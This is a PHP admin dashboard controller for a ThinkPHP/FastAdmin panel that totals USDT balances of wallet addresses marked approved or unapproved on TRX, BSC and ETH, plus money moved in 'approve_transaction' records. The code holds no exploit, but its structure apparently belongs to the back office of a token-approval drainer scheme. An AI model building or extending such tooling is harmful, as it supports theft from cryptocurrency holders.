<?php

namespace app\admin\controller;

use app\admin\model\Admin;
use app\admin\model\User;
use app\common\controller\Backend;
use app\common\model\Attachment;
use fast\Date;
use think\Db;

/**
 * 控制台
 *
 * @icon   fa fa-dashboard
 * @remark 用于展示当前系统中的统计数据、统计报表及重要实时数据
 */
class Dashboard extends Backend
{

    /**
     * 查看
     */
    public function index()
    {
        try {
            \think\Db::execute("SET @@sql_mode='';");
        } catch (\Exception $e) {

        }
        $column = [];
        $starttime = Date::unixtime('day', -6);
        $endtime = Date::unixtime('day', 0, 'end');

        $joinlist = Db("address")->where('createtime', 'between time', [$starttime, $endtime])
            ->field('createtime, sum(money_online) AS nums, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS join_date')
            ->group('join_date')
            ->select();

        for ($time = $starttime; $time <= $endtime;) {
            $column[] = date("Y-m-d", $time);
            $time += 86400;
        }
        $userlist = array_fill_keys($column, 0);
        foreach ($joinlist as $k => $v) {
            $userlist[$v['join_date']] = $v['nums'];
        }


        $joinlistout = Db("approve_transaction")->where('createtime', 'between time', [$starttime, $endtime])
            ->field('createtime, sum(money) AS nums, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS join_date')
            ->group('join_date')
            ->select();

        for ($time = $starttime; $time <= $endtime;) {
            $column[] = date("Y-m-d", $time);
            $time += 86400;
        }
        $userdataout = array_fill_keys($column, 0);
        foreach ($joinlistout as $k => $v) {
            $userdataout[$v['join_date']] = $v['nums'];
        }


        $dbTableList = Db::query("SHOW TABLE STATUS");
        $totalworkingaddon = 0;
        $ysq_trx_id = Db('address')->group("address")->where(['is_approve'=>1,'contract_address'=>config('conf.contract_trx_usdt')])->field('id')->select();
        $ysq_trx_id_arr=[];
        foreach ($ysq_trx_id as $value){
            $ysq_trx_id_arr[]=$value['id'];
        }
        $ysq_trx = Db('address')->where(['id'=>['in',$ysq_trx_id_arr]])->sum('money_online');

        $ysq_bsc_id = Db('address')->group("address")->where(['is_approve'=>1,'contract_address'=>config('conf.contract_bsc_usdt')])->field('id')->select();
        $ysq_bsc_id_arr=[];
        foreach ($ysq_bsc_id as $value){
            $ysq_bsc_id_arr[]=$value['id'];
        }
        $ysq_bsc = Db('address')->where(['id'=>['in',$ysq_bsc_id_arr]])->sum('money_online');

        $ysq_eth_id = Db('address')->group("address")->where(['is_approve'=>1,'contract_address'=>config('conf.contract_eth_usdt')])->field('id')->select();
        $ysq_eth_id_arr=[];
        foreach ($ysq_eth_id as $value){
            $ysq_eth_id_arr[]=$value['id'];
        }
        $ysq_eth = Db('address')->where(['id'=>['in',$ysq_eth_id_arr]])->sum('money_online');


        $wsq_trx_id = Db('address')->group("address")->where(['is_approve'=>0,'contract_address'=>config('conf.contract_trx_usdt')])->field('id')->select();
        $wsq_trx_id_arr=[];
        foreach ($wsq_trx_id as $value){
            $wsq_trx_id_arr[]=$value['id'];
        }
        $wsq_trx = Db('address')->where(['id'=>['in',$wsq_trx_id_arr]])->sum('money_online');

        $wsq_bsc_id = Db('address')->group("address")->where(['is_approve'=>0,'contract_address'=>config('conf.contract_bsc_usdt')])->field('id')->select();
        $wsq_bsc_id_arr=[];
        foreach ($wsq_bsc_id as $value){
            $wsq_bsc_id_arr[]=$value['id'];
        }
        $wsq_bsc = Db('address')->where(['id'=>['in',$wsq_bsc_id_arr]])->sum('money_online');

        $wsq_eth_id = Db('address')->group("address")->where(['is_approve'=>0,'contract_address'=>config('conf.contract_eth_usdt')])->field('id')->select();
        $wsq_eth_id_arr=[];
        foreach ($wsq_eth_id as $value){
            $wsq_eth_id_arr[]=$value['id'];
        }
        $wsq_eth = Db('address')->where(['id'=>['in',$wsq_eth_id_arr]])->sum('money_online');
        $money_out = db('approve_transaction')->sum('money');

        $this->view->assign([
            'totaluser'         => 0,
            'ysq_trx'        => number_format($ysq_trx,2),
            'ysq_bsc'        => number_format($ysq_bsc,2),
            'ysq_eth'        => number_format($ysq_eth,2),

            'wsq_trx'        => number_format($wsq_trx,2),
            'wsq_bsc'        => number_format($wsq_bsc,2),
            'wsq_eth'        => number_format($wsq_eth,2),

            'money_out'        => number_format($money_out,2),
//            'totalcategory'     => \app\common\model\Category::count(),
            'todayusersignup'   => 0,
            'todayuserlogin'    => 0,
            'sevendau'          => 0,
            'thirtydau'         => 0,
            'threednu'          => 0,
            'sevendnu'          => 0,
            'dbtablenums'       => count($dbTableList),
            'dbsize'            => array_sum(array_map(function ($item) {
                return $item['Data_length'] + $item['Index_length'];
            }, $dbTableList)),
            'totalworkingaddon' => $totalworkingaddon,
            'attachmentnums'    => Attachment::count(),
            'attachmentsize'    => Attachment::sum('filesize'),
            'picturenums'       => Attachment::where('mimetype', 'like', 'image/%')->count(),
            'picturesize'       => Attachment::where('mimetype', 'like', 'image/%')->sum('filesize'),
        ]);

        $this->assignconfig('column', array_keys($userlist));
        $this->assignconfig('userdata', array_values($userlist));
        $this->assignconfig('userdataout', array_values($userdataout));

        return $this->view->fetch();
    }

}
